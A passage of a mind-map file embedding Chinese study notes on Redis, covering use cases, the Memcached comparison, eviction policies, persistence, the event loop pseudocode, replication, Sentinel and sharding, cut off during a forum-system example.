    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0cc5cc424288493d2842b54f3bdeb88e8e392b61bc43f51b6342c4ba8d883808/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62656261363132652d646335622d346663322d383639642d3062323334303861633930612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/0cc5cc424288493d2842b54f3bdeb88e8e392b61bc43f51b6342c4ba8d883808/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62656261363132652d646335622d346663322d383639642d3062323334303861633930612e706e67" width="600px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/beba612e-dc5b-4fc2-869d-0b23408ac90a.png"/>
    </a><br/>
    

    <p dir="auto">
      在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。下图演示了查找 22 的过程。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4fdd83d646121a2f9e187b189a03f9c9761d4dd63982d0e896a3b23fa07c57e5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30656133376565322d633232342d346337392d623839352d6531333163363830356334302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/4fdd83d646121a2f9e187b189a03f9c9761d4dd63982d0e896a3b23fa07c57e5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30656133376565322d633232342d346337392d623839352d6531333163363830356334302e706e67" width="600px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0ea37ee2-c224-4c79-b895-e131c6805c40.png"/>
    </a><br/>
    

    <p dir="auto">
      与红黑树等平衡树相比，跳跃表具有以下优点：
    </p>
    <ul dir="auto">
      <li>
        插入速度非常快速，因为不需要进行旋转等操作来维护平衡性；
      </li>
      <li>
        更容易实现；
      </li>
      <li>
        支持无锁操作。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_849194266" CREATED="1754750570104" MODIFIED="1754750570104"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、使用场景
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_223403969" CREATED="1754750570106" MODIFIED="1754750570111"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      计数器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 计数器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#计数器">
</a>
    <p dir="auto">
      可以对 String 进行自增自减运算，从而实现计数器功能。
    </p>
    <p dir="auto">
      Redis 这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_183618572" CREATED="1754750570111" MODIFIED="1754750570115"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#缓存">
</a>
    <p dir="auto">
      将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1348426593" CREATED="1754750570115" MODIFIED="1754750570117"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      查找表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 查找表" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#查找表">
</a>
    <p dir="auto">
      例如 DNS 记录就很适合使用 Redis 进行存储。
    </p>
    <p dir="auto">
      查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1738268734" CREATED="1754750570118" MODIFIED="1754750570119"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      消息队列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 消息队列" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#消息队列">
</a>
    <p dir="auto">
      List 是一个双向链表，可以通过 lpush 和 rpop 写入和读取消息
    </p>
    <p dir="auto">
      不过最好使用 Kafka、RabbitMQ 等消息中间件。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1148707991" CREATED="1754750570120" MODIFIED="1754750570123"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      会话缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 会话缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#会话缓存">
</a>
    <p dir="auto">
      可以使用 Redis 来统一存储多台应用服务器的会话信息。
    </p>
    <p dir="auto">
      当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_899248601" CREATED="1754750570123" MODIFIED="1754750570125"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分布式锁实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分布式锁实现" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#分布式锁实现">
</a>
    <p dir="auto">
      在分布式场景下，无法使用单机环境下的锁来对多个节点上的进程进行同步。
    </p>
    <p dir="auto">
      可以使用 Redis 自带的 SETNX 命令实现分布式锁，除此之外，还可以使用官方提供的 RedLock 分布式锁实现。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1143389771" CREATED="1754750570126" MODIFIED="1754750570128"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      其它
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 其它" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#其它">
</a>
    <p dir="auto">
      Set 可以实现交集、并集等操作，从而实现共同好友等功能。
    </p>
    <p dir="auto">
      ZSet 可以实现有序性操作，从而实现排行榜等功能。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1797738735" CREATED="1754750570129" MODIFIED="1754750570131"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、Redis 与 Memcached
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、Redis 与 Memcached" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#五redis-与-memcached">
</a>
    <p dir="auto">
      两者都是非关系型内存键值数据库，主要有以下不同：
    </p>
  </body>
</html></richcontent>
<node ID="ID_1854270057" CREATED="1754750570131" MODIFIED="1754750570134"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数据类型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#数据类型">
</a>
    <p dir="auto">
      Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1409791076" CREATED="1754750570134" MODIFIED="1754750570136"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据持久化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数据持久化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#数据持久化">
</a>
    <p dir="auto">
      Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_955576415" CREATED="1754750570136" MODIFIED="1754750570139"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分布式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分布式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#分布式">
</a>
    <p dir="auto">
      Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。
    </p>
    <p dir="auto">
      Redis Cluster 实现了分布式的支持。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1829561871" CREATED="1754750570139" MODIFIED="1754750570141"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内存管理机制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 内存管理机制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#内存管理机制">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。
        </p>
      </li>
      <li>
        <p dir="auto">
          Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1383783205" CREATED="1754750570143" MODIFIED="1754750570145"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、键的过期时间
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、键的过期时间" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#六键的过期时间">
</a>
    <p dir="auto">
      Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。
    </p>
    <p dir="auto">
      对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1418913067" CREATED="1754750570145" MODIFIED="1754750570147"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、数据淘汰策略
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、数据淘汰策略" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#七数据淘汰策略">
</a>
    <p dir="auto">
      可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。
    </p>
    <p dir="auto">
      Redis 具体有 6 种淘汰策略：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          策略
        </th>
        <th>
          描述
        </th>
      </tr>
      <tr>
        <td>
          volatile-lru
        </td>
        <td>
          从已设置过期时间的数据集中挑选最近最少使用的数据淘汰
        </td>
      </tr>
      <tr>
        <td>
          volatile-ttl
        </td>
        <td>
          从已设置过期时间的数据集中挑选将要过期的数据淘汰
        </td>
      </tr>
      <tr>
        <td>
          volatile-random
        </td>
        <td>
          从已设置过期时间的数据集中任意选择数据淘汰
        </td>
      </tr>
      <tr>
        <td>
          allkeys-lru
        </td>
        <td>
          从所有数据集中挑选最近最少使用的数据淘汰
        </td>
      </tr>
      <tr>
        <td>
          allkeys-random
        </td>
        <td>
          从所有数据集中任意选择数据进行淘汰
        </td>
      </tr>
      <tr>
        <td>
          noeviction
        </td>
        <td>
          禁止驱逐数据
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法实际实现上并非针对所有 key，而是抽样一小部分并且从中选出被淘汰的 key。
    </p>
    <p dir="auto">
      使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。
    </p>
    <p dir="auto">
      Redis 4.0 引入了 volatile-lfu 和 allkeys-lfu 淘汰策略，LFU 策略通过统计访问频率，将访问频率最少的键值对淘汰。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1934055485" CREATED="1754750570148" MODIFIED="1754750570149"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、持久化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、持久化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#八持久化">
</a>
    <p dir="auto">
      Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1635974466" CREATED="1754750570150" MODIFIED="1754750570151"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      RDB 持久化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: RDB 持久化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#rdb-持久化">
</a>
    <p dir="auto">
      将某个时间点的所有数据都存放到硬盘上。
    </p>
    <p dir="auto">
      可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。
    </p>
    <p dir="auto">
      如果系统发生故障，将会丢失最后一次创建快照之后的数据。
    </p>
    <p dir="auto">
      如果数据量很大，保存快照的时间会很长。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_327881427" CREATED="1754750570152" MODIFIED="1754750570154"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      AOF 持久化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: AOF 持久化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#aof-持久化">
</a>
    <p dir="auto">
      将写命令添加到 AOF 文件（Append Only File）的末尾。
    </p>
    <p dir="auto">
      使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          选项
        </th>
        <th>
          同步频率
        </th>
      </tr>
      <tr>
        <td>
          always
        </td>
        <td>
          每个写命令都同步
        </td>
      </tr>
      <tr>
        <td>
          everysec
        </td>
        <td>
          每秒同步一次
        </td>
      </tr>
      <tr>
        <td>
          no
        </td>
        <td>
          让操作系统来决定何时同步
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <ul dir="auto">
      <li>
        always 选项会严重减低服务器的性能；
      </li>
      <li>
        everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响；
      </li>
      <li>
        no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。
      </li>
    </ul>
    <p dir="auto">
      随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1485310626" CREATED="1754750570155" MODIFIED="1754750570157"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、事务
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 九、事务" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#九事务">
</a>
    <p dir="auto">
      一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。
    </p>
    <p dir="auto">
      事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。
    </p>
    <p dir="auto">
      Redis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1886529790" CREATED="1754750570157" MODIFIED="1754750570159"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十、事件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十、事件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#十事件">
</a>
    <p dir="auto">
      Redis 服务器是一个事件驱动程序。
    </p>
  </body>
</html></richcontent>
<node ID="ID_155118066" CREATED="1754750570159" MODIFIED="1754750570161"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文件事件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 文件事件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#文件事件">
</a>
    <p dir="auto">
      服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。
    </p>
    <p dir="auto">
      Redis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/aa99d11eae5353c0ab184db785572ef1320d421e42d5de311fe326b14ad263f6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39656138366562352d303030612d343238312d623934382d3762353637626436663164382e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/aa99d11eae5353c0ab184db785572ef1320d421e42d5de311fe326b14ad263f6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39656138366562352d303030612d343238312d623934382d3762353637626436663164382e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9ea86eb5-000a-4281-b948-7b567bd6f1d8.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1021405001" CREATED="1754750570161" MODIFIED="1754750570163"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      时间事件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 时间事件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#时间事件">
</a>
    <p dir="auto">
      服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。
    </p>
    <p dir="auto">
      时间事件又分为：
    </p>
    <ul dir="auto">
      <li>
        定时事件：是让一段程序在指定的时间之内执行一次；
      </li>
      <li>
        周期性事件：是让一段程序每隔指定时间就执行一次。
      </li>
    </ul>
    <p dir="auto">
      Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1487575672" CREATED="1754750570163" MODIFIED="1754750570165"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      事件的调度与执行
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 事件的调度与执行" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#事件的调度与执行">
</a>
    <p dir="auto">
      服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。
    </p>
    <p dir="auto">
      事件调度与执行由 aeProcessEvents 函数负责，伪代码如下：
    </p>
    <pre>def aeProcessEvents():
    # 获取到达时间离当前时间最接近的时间事件
    time_event = aeSearchNearestTimer()
    # 计算最接近的时间事件距离到达还有多少毫秒
    remaind_ms = time_event.when - unix_ts_now()
    # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0
    if remaind_ms &lt; 0:
        remaind_ms = 0
    # 根据 remaind_ms 的值，创建 timeval
    timeval = create_timeval_with_ms(remaind_ms)
    # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定
    aeApiPoll(timeval)
    # 处理所有已产生的文件事件
    procesFileEvents()
    # 处理所有已到达的时间事件
    processTimeEvents()</pre>
    <p dir="auto">
      将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下：
    </p>
    <pre>def main():
    # 初始化服务器
    init_server()
    # 一直处理事件，直到服务器关闭为止
    while server_is_not_shutdown():
        aeProcessEvents()
    # 服务器关闭，执行清理操作
    clean_server()</pre>
    <p dir="auto">
      从事件处理的角度来看，服务器运行流程如下：
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/308580dfbd6e3cf51f713eb2ada774f28c4e563b37ca3412f1615f8917fc493d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63306139666139312d646132652d343839322d386339662d3830323036613666373034372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/308580dfbd6e3cf51f713eb2ada774f28c4e563b37ca3412f1615f8917fc493d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63306139666139312d646132652d343839322d386339662d3830323036613666373034372e706e67" width="350" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0a9fa91-da2e-4892-8c9f-80206a6f7047.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_250495576" CREATED="1754750570165" MODIFIED="1754750570167"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十一、复制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十一、复制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#十一复制">
</a>
    <p dir="auto">
      通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。
    </p>
    <p dir="auto">
      一个从服务器只能有一个主服务器，并且不支持主主复制。
    </p>
  </body>
</html></richcontent>
<node ID="ID_674757402" CREATED="1754750570168" MODIFIED="1754750570169"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      连接过程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 连接过程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#连接过程">
</a>
    <ol dir="auto">
      <li>
        <p dir="auto">
          主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令；
        </p>
      </li>
      <li>
        <p dir="auto">
          从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令；
        </p>
      </li>
      <li>
        <p dir="auto">
          主服务器每执行一次写命令，就向从服务器发送相同的写命令。
        </p>
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
<node ID="ID_71002668" CREATED="1754750570170" MODIFIED="1754750570171"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      主从链
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 主从链" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#主从链">
</a>
    <p dir="auto">
      随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e2e4ae4e2ddc5d97f475d644c4ea576707937efdb9459014f701741dc1c434b6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33393561396538332d623161312d346131642d623137302d6430383165376262356261622e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/e2e4ae4e2ddc5d97f475d644c4ea576707937efdb9459014f701741dc1c434b6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33393561396538332d623161312d346131642d623137302d6430383165376262356261622e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/395a9e83-b1a1-4a1d-b170-d081e7bb5bab.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1966046460" CREATED="1754750570172" MODIFIED="1754750570174"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十二、Sentinel
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十二、Sentinel" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#十二sentinel">
</a>
    <p dir="auto">
      Sentinel（哨兵）可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_71240417" CREATED="1754750570174" MODIFIED="1754750570176"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十三、分片
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十三、分片" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#十三分片">
</a>
    <p dir="auto">
      分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，这种方法在解决某些问题时可以获得线性级别的性能提升。
    </p>
    <p dir="auto">
      假设有 4 个 Redis 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，... ，有不同的方式来选择一个指定的键存储在哪个实例中。
    </p>
    <ul dir="auto">
      <li>
        最简单的方式是范围分片，例如用户 id 从 0~1000 的存储到实例 R0 中，用户 id 从 1001~2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。
      </li>
      <li>
        还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。
      </li>
    </ul>
    <p dir="auto">
      根据执行分片的位置，可以分为三种分片方式：
    </p>
    <ul dir="auto">
      <li>
        客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。
      </li>
      <li>
        代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。
      </li>
      <li>
        服务器分片：Redis Cluster。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1126199029" CREATED="1754750570176" MODIFIED="1754750570178"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十四、一个简单的论坛系统分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十四、一个简单的论坛系统分析" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#十四一个简单的论坛系统分析">
</a>
    <p dir="auto">
      该论坛系统功能如下：
    </p>
    <ul dir="auto">
      <li>
        可以发布文章；
      </li>
      <li>
        可以对文章进行点赞；
      </li>
      <li>
        在首页可以按文章的发布时间或者文章的点赞数进行排序显示。
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1972622091" CREATED="1754750570178" MODIFIED="1754750570180"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文章信息
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 文章信息" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#文章信息">
</a>
    <p dir="auto">
      文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。
    </p>
    <p dir="auto">
      Redis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。
    </p>
